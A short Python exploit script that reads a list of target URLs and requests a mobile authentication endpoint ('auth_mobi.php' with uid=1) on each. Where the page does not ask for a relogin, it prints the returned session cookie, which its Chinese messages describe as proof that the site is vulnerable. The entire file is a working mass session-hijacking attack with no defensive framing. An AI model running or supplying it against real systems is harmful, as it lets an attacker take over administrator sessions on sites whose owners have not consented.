import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}


def request(urls):
    for url in urls:
        target_url = url+"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
        response = requests.get(target_url.strip(), headers=headers)


        res = response.text


        if 'RELOGIN' in res:
            print(f'目标:{url}管理员未登录，获取cookie失败')
        else:
            # 获取set-cookie的值
            cookie = response.headers['set-cookie']
            if cookie:
                print(f'目标{url}存在该漏洞，cookie为{cookie}')


if __name__ == '__main__':
    with open('url.txt', 'r') as f:
        urls = f.readlines()
    urls = [i.strip() for i in urls]
    request(urls)